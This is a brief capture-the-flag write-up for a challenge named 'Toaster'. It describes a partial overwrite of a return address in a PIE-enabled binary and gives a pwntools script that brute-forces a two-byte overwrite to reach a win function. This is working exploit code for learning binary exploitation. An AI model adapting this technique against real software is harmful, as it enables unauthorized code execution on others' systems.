## Toaster
This challenge involves a partial overwrite, where attackers must exploit an ELF binary with PIE enabled. Players can overwrite the least significant byte of the return address to jump to the win function.

## Solve
```py
from pwn import *

while True:
    io = process('./toaster')
    payload = b'A' * 40
    payload += p16(0x927d)

    io.recvuntil(b'Please give me your secret recipe')
    io.send(payload)

    out = io.recvall(timeout=2)
    
    if b'You managed to make the perfect toast' in out:
        log.success('Exploit successful!')
        flag = out.split(b': ')[1].strip()
        log.success(f'Flag: {flag.decode()}')
        break
    else:
        io.close()
```
